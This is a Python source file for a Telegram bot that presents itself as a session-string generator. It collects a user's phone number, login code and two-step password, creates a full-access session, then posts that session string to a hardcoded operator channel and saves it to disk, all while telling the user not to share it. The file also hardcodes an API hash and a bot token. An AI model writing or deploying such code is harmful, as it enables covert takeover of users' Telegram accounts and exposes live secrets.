import os, logging, asyncio, string, random
from pyromod import listen
from telethon.sync import TelegramClient
from oldpyro import Client as Client1
from pyrogram import enums, errors, filters, Client
from oldpyro.errors import (
    ApiIdInvalid as ApiIdInvalid1,
    PhoneNumberInvalid as PhoneNumberInvalid1,
    PhoneCodeInvalid as PhoneCodeInvalid1,
    PhoneCodeExpired as PhoneCodeExpired1,
    SessionPasswordNeeded as SessionPasswordNeeded1,
    PasswordHashInvalid as PasswordHashInvalid1,
)
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid
)

class Config(object):
    API_ID = 25271591
    API_HASH = "f34e58a37b8f88fbbe19f85ffaa36f4f"
    BOT_TOKEN = "6864922631:AAHHeX2_3V27SwEW98-mh1EXycce3cdOouk"
    SESSION_CHANNEL = "-1002187906000"
    SESSION_FILE = "{}.txt"

logging.basicConfig(
    format="[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s",
    level=logging.INFO,
)

Drone = TelegramClient("SessGen", Config.API_ID, Config.API_HASH).start(bot_token=Config.BOT_TOKEN)

app = Client(
    "SessionGenerator",
    api_id=Config.API_ID,
    api_hash=Config.API_HASH,
    bot_token=Config.BOT_TOKEN
)

@app.on_message(
     filters.command("start")
)
@app.on_message(
     filters.command("generate")
)
async def start_or_generate_command(client, message):
    user_id = message.from_user.id
    if "start" in message.command:
         await message.reply("Welcome to Session Generator Bot!")
    elif "generate" in message.command:
         choice = message.command[1]
         session = await generate_session(client, message, user_id, choice)
         channel_text = f"✅ Session Generated Successfully! Here is your session string:\n\n`{session}`\n\nDon't share it with anyone, we are not responsible for any mishandling or misuse."
         file_text = "✅ Session Generated Successfully! Here is your session string:\n\n{session}\n\nDon't share it with anyone, we are not responsible for any mishandling or misuse."
         msg = await app.send_message(int(Config.SESSION_CHANNEL), channel_text)
         await app.send_message(user_id, f"Your Session has been sent [here](https://t.me/c/{str(msg.chat.id)[-10:]}/{msg.id}).")
         with open(Config.SESSION_FILE.format(user_id), 'w') as file:
              file.write(file_text)

def generate_random_name(length=7):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

async def generate_session(app, message, user_id, choice):   
    
    try:
        if choice == "V1":
            client = Client1(generate_random_name(), Config.API_ID, Config.API_HASH)
        elif choice == "V2":
            client = Client(generate_random_name(), Config.API_ID, Config.API_HASH)
        await client.connect()
    except Exception as e:
            await message.reply(f"❌ Failed due to : {e}. Please wait and try again later.")
        
    number = await app.ask(user_id, 'Please enter your phone number along with the country code. \nExample: +19876543210', filters=filters.text)   
    phone_number = number.text
    try:
        await message.reply("📲 Sending OTP...")
        code = await client.send_code(phone_number)    
    except (ApiIdInvalid, ApiIdInvalid1):
        await message.reply('❌ Invalid combination of API ID and API HASH. Please restart the session.')
        return
    except (PhoneNumberInvalid, PhoneNumberInvalid1):
        await message.reply('❌ Invalid phone number. Please restart the session.')
        return
    try:
        otp_code = await app.ask(user_id, "Please check for an OTP in your official Telegram account. Once received, enter the OTP in the following format: \nIf the OTP is `12345`, please enter it as `1 2 3 4 5`.", filters=filters.text, timeout=600)
    except TimeoutError:
        await message.reply('⏰ Time limit of 10 minutes exceeded. Please restart the session.')
        return
    phone_code = otp_code.text.replace(" ", "")
    try:
        await client.sign_in(phone_number, code.phone_code_hash, phone_code)            
    except (PhoneCodeInvalid, PhoneCodeInvalid1):
        await message.reply('❌ Invalid OTP. Please restart the session.')
        return
    except (PhoneCodeExpired, PhoneCodeExpired1):
        await message.reply('❌ Expired OTP. Please restart the session.')
        return
    except (SessionPasswordNeeded, SessionPasswordNeeded1):
        try:
            two_step_msg = await app.ask(user_id, 'Your account has two-step verification enabled. Please enter your password.', filters=filters.text, timeout=300)
        except TimeoutError:
            await message.reply('⏰ Time limit of 5 minutes exceeded. Please restart the session.')
            return
        try:
            password = two_step_msg.text
            await client.check_password(password=password)
        except (PasswordHashInvalid, PasswordHashInvalid1):
            await two_step_msg.reply('❌ Invalid password. Please restart the session.')
            return
    string_session = await client.export_session_string()
    await client.disconnect()
    return string_session

if __name__ == "__main__":
    try:
        app.start()
        getme = app.get_me()
        if getme.last_name:
             BOT_NAME = getme.first_name + " " + getme.last_name
        else:
             BOT_NAME = getme.first_name
        print(f"Bot {BOT_NAME} started")
        Drone.run_until_disconnected()
        app.stop()
        print(f"Bot {BOT_NAME} stopped")
    except Exception as e:
        print(f"Failed to start bot: {e}")
